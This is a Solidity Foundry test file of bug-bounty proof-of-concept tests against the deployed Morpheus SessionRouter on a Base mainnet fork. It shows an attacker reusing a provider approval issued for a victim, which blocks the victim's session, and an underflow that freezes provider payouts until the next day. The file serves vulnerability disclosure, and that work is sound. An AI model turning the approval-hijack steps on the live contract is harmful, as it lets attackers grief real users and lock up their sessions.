// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * PoC tests for two findings in the Morpheus SessionRouter facet (Base), reached
 * through the LumerinDiamond, for the MOR Bug Bounty Program v2.
 *
 * F1: a provider approval is NOT bound to the user it was issued for.
 *     SessionRouter._extractProviderApproval decodes (bidId, chainId, USER, timestamp)
 *     and discards the address; openSession never compares it to user_. Anyone who
 *     captures a live approval (10-minute TTL) can consume it with their own stake;
 *     the victim's own open then reverts SessionDuplicateApproval.
 *
 * F2: claimForProvider subtracts the dispute on-hold amount UNCONDITIONALLY and
 *     _getProviderOnHoldAmount never caps closedAt at endsAt. After a late,
 *     no-dispute close whose payment was capped by the provider reward limiter,
 *     a same-day claimForProvider for the remainder underflows and reverts; the
 *     remainder is frozen until the next UTC day.
 *
 * Both tests run against a pinned Base mainnet fork and interact with the diamond
 * ONLY through its real public functions. All actors are fresh, unprivileged EOAs
 * funded by fork-local storage writes. No owner/admin/multisig account is used anywhere.
 *
 * Run: forge test
 */

/// @notice Minimal cheatcode interface (avoids a forge-std dependency).
interface Vm {
    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256 forkId);
    function warp(uint256 newTimestamp) external;
    function prank(address msgSender) external;
    function addr(uint256 privateKey) external returns (address account);
    function sign(uint256 privateKey, bytes32 digest) external returns (uint8 v, bytes32 r, bytes32 s);
    function load(address target, bytes32 slot) external returns (bytes32 data);
    function store(address target, bytes32 slot, bytes32 value) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @notice Minimal combined interface: ONLY the diamond functions these tests call.
/// Struct layouts copied verbatim from the deployed source (ISessionStorage /
/// IBidStorage / IProviderStorage of Morpheus-Lumerin-Node, repo main == deployed).
interface IDiamond {
    struct Provider {
        string endpoint;
        uint256 stake;
        uint128 createdAt;
        uint128 limitPeriodEnd;
        uint256 limitPeriodEarned;
        bool isDeleted;
    }

    struct Bid {
        address provider;
        bytes32 modelId;
        uint256 pricePerSecond;
        uint256 nonce;
        uint128 createdAt;
        uint128 deletedAt;
    }

    struct Session {
        address user;
        bytes32 bidId;
        uint256 stake;
        bytes closeoutReceipt;
        uint256 closeoutType;
        uint256 providerWithdrawnAmount;
        uint128 openedAt;
        uint128 endsAt;
        uint128 closedAt;
        bool isActive;
        bool isDirectPaymentFromUser;
    }

    // ProviderRegistry facet
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function getProvider(address provider_) external view returns (Provider memory);

    // ModelRegistry facet
    function modelRegister(
        address modelOwner_,
        bytes32 baseModelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] calldata tags_
    ) external;
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);

    // Marketplace facet
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function getBid(bytes32 bidId_) external view returns (Bid memory);
    function isBidActive(bytes32 bidId_) external view returns (bool);

    // SessionRouter facet
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function claimForProvider(bytes32 sessionId_) external;
    function getSession(bytes32 sessionId_) external view returns (Session memory);
    function getIsProviderApprovalUsed(bytes memory approval_) external view returns (bool);
    function stakeToStipend(uint256 amount_, uint128 timestamp_) external view returns (uint256);
    function stipendToStake(uint256 stipend_, uint128 timestamp_) external view returns (uint256);
    function startOfTheDay(uint128 timestamp_) external pure returns (uint128);

    // Diamond loupe
    function facetAddress(bytes4 functionSelector_) external view returns (address);
}

contract SessionRouterPoCTest {
    Vm internal constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address internal constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address internal constant SESSION_ROUTER_FACET = 0x3a3952F0e57B343F00B31f7da039Ef16389B7260;
    address internal constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;

    /// Base block pinned for the fork (state re-read at audit time; see README).
    uint256 internal constant FORK_BLOCK = 58057831;

    /// Bid price used by both tests: 0.001 MOR/second (live range is 1e10..1e16 wei/s).
    uint256 internal constant PRICE = 1e15;

    // Fresh, unprivileged test keys (no roles anywhere in the protocol).
    uint256 internal constant PROVIDER1_PK = 0x1001;
    uint256 internal constant VICTIM_PK = 0x2002;
    uint256 internal constant ATTACKER_PK = 0x3003;
    uint256 internal constant PROVIDER2_PK = 0x5005;
    uint256 internal constant USER2_PK = 0x4004;
    uint256 internal constant PROVIDER3_PK = 0x6006;
    uint256 internal constant USER3_PK = 0x7007;

    uint256 internal _morBalanceSlot;

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
        _morBalanceSlot = _findMorBalanceSlot();
        // Re-verification: the SessionRouter selectors must still route to the
        // facet address from the audit snapshot.
        require(
            IDiamond(DIAMOND).facetAddress(IDiamond.openSession.selector) == SESSION_ROUTER_FACET,
            "facet changed: openSession"
        );
        require(
            IDiamond(DIAMOND).facetAddress(IDiamond.claimForProvider.selector) == SESSION_ROUTER_FACET,
            "facet changed: claimForProvider"
        );
    }

    /*//////////////////////////////////////////////////////////////
                                HELPERS
    //////////////////////////////////////////////////////////////*/

    /// Finds the ERC20 _balances mapping slot of the MOR token empirically:
    /// the diamond holds a large, known MOR balance at the fork block; the slot
    /// whose keccak256(abi.encode(diamond, slot)) cell equals that balance is
    /// the mapping base. (This forge build has no ERC20 `deal` cheatcode.)
    function _findMorBalanceSlot() internal returns (uint256) {
        uint256 known = IERC20(MOR).balanceOf(DIAMOND);
        require(known > 0, "diamond MOR balance is zero");
        for (uint256 i = 0; i < 32; i++) {
            bytes32 loc = keccak256(abi.encode(DIAMOND, i));
            if (uint256(vm.load(MOR, loc)) == known) return i;
        }
        revert("MOR balance slot not found");
    }

    /// Funds `to` with exactly `amount` MOR on the fork (stdstore-style write,
    /// verified by a balanceOf read-back). Fork-only; touches no real account.
    function _dealMOR(address to, uint256 amount) internal {
        vm.store(MOR, keccak256(abi.encode(to, _morBalanceSlot)), bytes32(amount));
        require(IERC20(MOR).balanceOf(to) == amount, "deal via store failed");
    }

    function _sign(uint256 pk, bytes memory data) internal returns (bytes memory) {
        // Matches SessionRouter._isValidProviderReceipt:
        // ECDSA.recover(toEthSignedMessageHash(keccak256(data)), sig) == provider
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(data)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }

    /// Registers a provider (with `stake_` MOR), registers a model owned by the
    /// provider, and posts a bid at PRICE. Returns (provider, bidId).
    /// Setup uses ONLY the diamond's permissionless self-service functions.
    function _setupProvider(uint256 pk, uint256 stake_, bytes32 baseModelId_)
        internal
        returns (address provider, bytes32 bidId)
    {
        provider = vm.addr(pk);
        _dealMOR(provider, 100_000 ether);

        vm.prank(provider);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);

        vm.prank(provider);
        IDiamond(DIAMOND).providerRegister(provider, stake_, "poc.local");

        bytes32 modelId = IDiamond(DIAMOND).getModelId(provider, baseModelId_);
        string[] memory tags = new string[](0);
        vm.prank(provider);
        IDiamond(DIAMOND).modelRegister(provider, baseModelId_, bytes32(0), 0, 1 ether, "poc-model", tags);

        vm.prank(provider);
        bidId = IDiamond(DIAMOND).postModelBid(provider, modelId, PRICE);
        require(IDiamond(DIAMOND).isBidActive(bidId), "bid not active");
    }

    function _fundUser(address user, uint256 amount) internal {
        _dealMOR(user, amount);
        vm.prank(user);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
    }

    /// Scalar view of a session (keeps the 11-field struct out of caller frames).
    function _sessionScalars(bytes32 sessionId_)
        internal
        view
        returns (
            address user,
            uint256 stake,
            uint256 withdrawn,
            uint128 openedAt,
            uint128 endsAt,
            uint128 closedAt,
            uint256 closeoutType
        )
    {
        IDiamond.Session memory s = IDiamond(DIAMOND).getSession(sessionId_);
        return (s.user, s.stake, s.providerWithdrawnAmount, s.openedAt, s.endsAt, s.closedAt, s.closeoutType);
    }

    function _assertEq(uint256 a, uint256 b, string memory msg_) internal pure {
        require(a == b, msg_);
    }

    function _assertEqAddr(address a, address b, string memory msg_) internal pure {
        require(a == b, msg_);
    }

    function _assertTrue(bool c, string memory msg_) internal pure {
        require(c, msg_);
    }

    function _assertBytesEq(bytes memory a, bytes memory b, string memory msg_) internal pure {
        require(keccak256(a) == keccak256(b), msg_);
    }

    /*//////////////////////////////////////////////////////////////
        F1 — PROVIDER APPROVAL IS NOT BOUND TO ITS USER
    //////////////////////////////////////////////////////////////*/

    function testF1_ApprovalNotBoundToUser() public {
        (, bytes32 bidId) = _setupProvider(PROVIDER1_PK, 1 ether, keccak256("poc-model-f1"));
        address victim = vm.addr(VICTIM_PK);
        address attacker = vm.addr(ATTACKER_PK);

        // The provider signs an approval FOR THE VICTIM, in the exact production
        // format: abi.encode(bidId, chainId, USER, timestamp).
        bytes memory approval = abi.encode(bidId, block.chainid, victim, uint128(block.timestamp));
        bytes memory sig = _sign(PROVIDER1_PK, approval);
        {
            (, , address namedUser, ) = abi.decode(approval, (bytes32, uint256, address, uint128));
            _assertEqAddr(namedUser, victim, "approval must name the victim");
        }

        _fundUser(attacker, 10_000 ether);
        uint256 diamondBalBefore = IERC20(MOR).balanceOf(DIAMOND);

        // ATTACK: the attacker (who the provider never approved) consumes the
        // victim's approval with the attacker's own stake.
        bytes32 sessionId = _openAs(attacker, 10_000 ether, approval, sig);
        {
            (address sUser, uint256 sStake, , uint128 openedAt, uint128 endsAt, , ) = _sessionScalars(sessionId);
            _assertEqAddr(sUser, attacker, "session opened for ATTACKER using victim's approval");
            _assertEq(sStake, 10_000 ether, "attacker stake pulled");
            // The session is stipend-backed: its duration is the full stipend
            // duration for a 10,000 MOR stake (~29.2156 MOR of stipend value).
            uint256 stipend = IDiamond(DIAMOND).stakeToStipend(10_000 ether, openedAt);
            _assertEq(uint256(endsAt - openedAt), stipend / PRICE, "attacker got full stipend duration");
            _assertTrue(stipend > 29 ether && stipend < 30 ether, "stipend is ~29.2 MOR");
        }
        _assertTrue(IDiamond(DIAMOND).getIsProviderApprovalUsed(approval), "approval marked used by attacker");
        _assertEq(IERC20(MOR).balanceOf(attacker), 0, "attacker stake spent");
        _assertEq(IERC20(MOR).balanceOf(DIAMOND), diamondBalBefore + 10_000 ether, "diamond received attacker stake");

        // VICTIM: the victim's own open with their own approval now reverts,
        // because the attacker burned the single-use approval.
        _fundUser(victim, 10_000 ether);
        {
            vm.prank(victim);
            (bool ok, bytes memory ret) = DIAMOND.call(
                abi.encodeWithSelector(IDiamond.openSession.selector, victim, 10_000 ether, false, approval, sig)
            );
            _assertTrue(!ok, "victim open must revert");
            _assertBytesEq(
                ret,
                abi.encodeWithSelector(bytes4(keccak256("SessionDuplicateApproval()"))),
                "victim revert must be SessionDuplicateApproval"
            );
        }
        _assertEq(IERC20(MOR).balanceOf(victim), 10_000 ether, "victim funds untouched by reverted open");

        // CONTROL: with a FRESH approval naming the victim, the victim opens fine.
        // This isolates the failure above to the burned approval alone.
        bytes memory approval2 = abi.encode(bidId, block.chainid, victim, uint128(block.timestamp) + 1);
        bytes32 sessionIdV = _openAs(victim, 10_000 ether, approval2, _sign(PROVIDER1_PK, approval2));
        (address vUser, , , , , , ) = _sessionScalars(sessionIdV);
        _assertEqAddr(vUser, victim, "control: victim opens with fresh approval");
    }

    function _openAs(address user, uint256 amount, bytes memory approval, bytes memory sig)
        internal
        returns (bytes32)
    {
        vm.prank(user);
        return IDiamond(DIAMOND).openSession(user, amount, false, approval, sig);
    }

    /*//////////////////////////////////////////////////////////////
        F2 — claimForProvider SAME-DAY FREEZE (UNDERFLOW)
    //////////////////////////////////////////////////////////////*/

    /// Opens a session for `user` on `bidId` sized so the provider reward is
    /// ~3.6 MOR (stake chosen via the contract's own stipendToStake), then closes
    /// it 30 minutes AFTER endsAt (late, same UTC day) with a VALID provider
    /// receipt (no dispute). Returns scalars describing the closed session.
    function _openAndLateClose(uint256 providerPk, address user, bytes32 bidId)
        internal
        returns (bytes32 sessionId, uint256 reward, uint256 withdrawn, uint128 openedAt, uint128 closedAt)
    {
        uint128 t0 = uint128(block.timestamp);
        uint256 stake = IDiamond(DIAMOND).stipendToStake(3.6 ether, t0);
        _assertTrue(stake > 1_000 ether && stake < 1_500 ether, "stake should be ~1,232 MOR");

        _fundUser(user, stake);
        bytes memory approval = abi.encode(bidId, block.chainid, user, t0);
        sessionId = _openAs(user, stake, approval, _sign(providerPk, approval));

        uint128 endsAt;
        (, , , openedAt, endsAt, , ) = _sessionScalars(sessionId);
        reward = uint256(endsAt - openedAt) * PRICE;
        _assertTrue(reward > 3 ether && reward < 4.2 ether, "reward should be ~3.6 MOR");

        uint256 closeTs = uint256(endsAt) + 1800; // 30 min late
        _assertEq(
            uint256(IDiamond(DIAMOND).startOfTheDay(uint128(closeTs))),
            uint256(IDiamond(DIAMOND).startOfTheDay(openedAt)),
            "open and close must be on the same UTC day"
        );
        vm.warp(closeTs);
        _lateClose(providerPk, user, sessionId, closeTs);

        uint256 closeoutType;
        (, , withdrawn, , , closedAt, closeoutType) = _sessionScalars(sessionId);
        _assertEq(uint256(closedAt), closeTs, "closedAt set to late close time");
        _assertEq(closeoutType, 0, "valid receipt => no dispute");
    }

    /// Closes `sessionId` as its user with a VALID provider receipt
    /// (no dispute) at `closeTs`.
    function _lateClose(uint256 providerPk, address user, bytes32 sessionId, uint256 closeTs) internal {
        bytes memory receipt = abi.encode(sessionId, block.chainid, uint128(closeTs), uint32(1000), uint32(100));
        bytes memory sig = _sign(providerPk, receipt);
        vm.prank(user);
        IDiamond(DIAMOND).closeSession(receipt, sig);
    }

    function testF2_ClaimForProviderSameDayFreeze() public {
        // Provider registers with only 1 MOR stake, so the 365-day reward limiter
        // (earnings capped at own stake per period) caps the close-time payment
        // at 1 MOR and leaves a remainder of ~2.6 MOR owed.
        (address provider, bytes32 bidId) = _setupProvider(PROVIDER2_PK, 1 ether, keccak256("poc-model-f2"));
        address user = vm.addr(USER2_PK);

        uint256 provBalBeforeClose = IERC20(MOR).balanceOf(provider);
        (bytes32 sessionId, uint256 reward, uint256 withdrawn, uint128 openedAt, uint128 closedAt) =
            _openAndLateClose(PROVIDER2_PK, user, bidId);

        // Close-time payment was capped by the limiter at exactly the 1 MOR stake.
        _assertEq(withdrawn, 1 ether, "close paid exactly the limiter cap (1 MOR)");
        _assertEq(
            IERC20(MOR).balanceOf(provider), provBalBeforeClose + 1 ether, "provider received the capped amount at close"
        );
        uint256 remainder = reward - withdrawn;
        _assertTrue(remainder > 0, "a remainder must remain owed");

        // Give the provider limiter headroom (top stake up to 4 MOR): 3 MOR of
        // headroom >= remainder. So the freeze below is NOT the limiter's doing.
        vm.prank(provider);
        IDiamond(DIAMOND).providerRegister(provider, 3 ether, "poc.local");
        {
            IDiamond.Provider memory p = IDiamond(DIAMOND).getProvider(provider);
            _assertEq(p.stake - p.limitPeriodEarned, 3 ether, "limiter headroom of 3 MOR must exist");
        }

        // The amount claimForProvider will wrongly subtract: the dispute on-hold
        // formula over the FULL open->close window (closedAt not capped at endsAt),
        // applied even though this close had NO dispute.
        uint256 onHold = (uint256(closedAt) - uint256(openedAt)) * PRICE;
        _assertTrue(onHold > remainder, "uncapped on-hold exceeds the remainder -> subtraction underflows");

        // SAME-DAY CLAIM REVERTS with an arithmetic panic, despite the headroom.
        uint256 balBeforeClaim = IERC20(MOR).balanceOf(provider);
        {
            vm.prank(provider);
            (bool ok, bytes memory ret) =
                DIAMOND.call(abi.encodeWithSelector(IDiamond.claimForProvider.selector, sessionId));
            _assertTrue(!ok, "same-day claimForProvider must revert");
            _assertBytesEq(ret, abi.encodeWithSignature("Panic(uint256)", 0x11), "revert must be arithmetic underflow");
        }
        _assertEq(IERC20(MOR).balanceOf(provider), balBeforeClaim, "reverted claim paid nothing");

        // NEXT UTC DAY: the on-hold term drops to 0 and the identical claim
        // succeeds, paying exactly the frozen remainder.
        uint256 nextDay = uint256(IDiamond(DIAMOND).startOfTheDay(closedAt)) + 1 days + 1;
        vm.warp(nextDay);
        vm.prank(provider);
        IDiamond(DIAMOND).claimForProvider(sessionId);
        _assertEq(
            IERC20(MOR).balanceOf(provider), balBeforeClaim + remainder, "next-day claim pays exactly the frozen remainder"
        );
        (, , uint256 withdrawnFinal, , , , ) = _sessionScalars(sessionId);
        _assertEq(withdrawnFinal, reward, "provider fully paid after next-day claim");
    }

    /// Control for F2: a provider whose limiter never binds is paid in FULL at
    /// close — yet a same-day claimForProvider STILL panics (0 - onHold), proving
    /// the on-hold deduction is applied unconditionally, not just in disputes.
    /// The next day the same call succeeds as a clean no-op paying 0.
    function testF2_Control_FullyPaidProviderSameDayClaimAlsoPanics() public {
        (address provider, bytes32 bidId) = _setupProvider(PROVIDER3_PK, 100 ether, keccak256("poc-model-f2c"));
        address user = vm.addr(USER3_PK);

        (bytes32 sessionId, uint256 reward, uint256 withdrawn, , uint128 closedAt) =
            _openAndLateClose(PROVIDER3_PK, user, bidId);

        _assertEq(withdrawn, reward, "control: close pays in full when limiter does not bind");

        {
            vm.prank(provider);
            (bool ok, bytes memory ret) =
                DIAMOND.call(abi.encodeWithSelector(IDiamond.claimForProvider.selector, sessionId));
            _assertTrue(!ok, "control: same-day claim must revert even when fully paid");
            _assertBytesEq(ret, abi.encodeWithSignature("Panic(uint256)", 0x11), "control: revert is arithmetic underflow");
        }

        uint256 nextDay = uint256(IDiamond(DIAMOND).startOfTheDay(closedAt)) + 1 days + 1;
        vm.warp(nextDay);
        uint256 balBefore = IERC20(MOR).balanceOf(provider);
        vm.prank(provider);
        IDiamond(DIAMOND).claimForProvider(sessionId);
        _assertEq(IERC20(MOR).balanceOf(provider), balBefore, "control: next-day claim is a no-op paying 0");
    }
}
